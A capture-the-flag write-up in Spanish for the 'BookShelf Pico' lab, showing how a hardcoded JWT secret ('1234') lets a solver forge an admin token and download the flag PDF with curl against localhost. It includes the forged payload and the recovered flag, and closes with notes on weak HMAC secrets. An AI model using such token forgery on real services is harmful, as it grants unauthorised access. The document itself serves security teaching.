## Descripción
BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Archivo fuente: `bookshelf-pico.zip`
Credenciales: `user:user`
Instancia: `http://localhost:3224`

## Solución
- Analizamos el código fuente de la aplicación en Java (Spring Boot) provisto en `bookshelf-pico.zip`
- Revisamos la clase `SecretGenerator.java` encargada de obtener la clave para firmar los JSON Web Tokens (JWT); observamos que si no existe el archivo de clave en el disco, se genera un secreto estático y predecible:
  ```java
  private String generateRandomString(int len) {
      // not so random
      return "1234";
  }
  ```
  Esto significa que el secreto para la firma HMAC-SHA256 de los tokens JWT es `"1234"`
- En `JwtService.java` observamos el formato del token: utiliza el emisor (`iss`) `"bookshelf"`, algoritmo `HS256` y almacena los claims `userId`, `email` y `role`
- Revisamos `BookShelfConfig.java` para ver los usuarios iniciales del sistema:
  ```java
  User admin = new User();
  admin.setProfilePicName("default-avatar.png")
       .setRole(AdminRole)
       .setEmail("admin");
  ```
  El usuario `user` tiene `userId: 1` y el usuario `admin` tiene `userId: 2` (con rol `Admin`). Además, el libro con la bandera ("Flag") tiene como requisito el rol `Admin`
- Como conocemos la clave de firma (`"1234"`), forjamos un token JWT con privilegios de administrador:
  - **Header**: `{"alg": "HS256", "typ": "JWT"}`
  - **Payload**:
    ```json
    {
      "iss": "bookshelf",
      "userId": 2,
      "email": "admin",
      "role": "Admin"
    }
    ```
  - **Firma**: HMAC-SHA256 firmado con la clave `"1234"`
- Consultamos la lista de libros con el token forjado para obtener el identificador del libro "Flag" (`id: 5`):
  ```bash
  curl -s -H "Authorization: Bearer <TOKEN>" http://localhost:3224/base/books
  ```
- Descargamos el archivo PDF correspondiente al libro de la bandera (`/base/books/pdf/5`):
  ```bash
  curl -s -H "Authorization: Bearer <TOKEN>" http://localhost:3224/base/books/pdf/5 -o flag.pdf
  ```
- Extraemos el texto del PDF descargado con el comando `strings`:
  ```bash
  strings flag.pdf | grep academy
  ```
- Obtenemos la bandera

```text
academy{w34k_jwt_n0t_g00d_1107047a}
```

## Notas Adicionales
- **Vulnerabilidad de clave secreta débil en JWT**: Al utilizar algoritmos de firma simétrica como `HS256`, la seguridad depende enteramente de la complejidad y confidencialidad del secreto compartido. Si el secreto es trivial (como `"1234"`), cualquier usuario puede falsificar firmas y asignarse roles de alto privilegio (`Admin`).
- **Control de Acceso Basado en Roles (RBAC)**: La aplicación verifica que el valor del rol del usuario sea mayor o igual al del libro en `BookPdfAccessCheck.java` (`user.getRole().getValue() >= book.getRole().getValue()`). Al colocar el identificador de usuario `userId: 2` en el token forjado, el servidor valida exitosamente que el usuario en base de datos posee rol `Admin`.

## Referencias
- [JWT.io - Introducción a JSON Web Tokens](https://jwt.io/introduction)
- [PortSwigger - JWT attacks](https://portswigger.net/web-security/jwt)
- [OWASP - JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)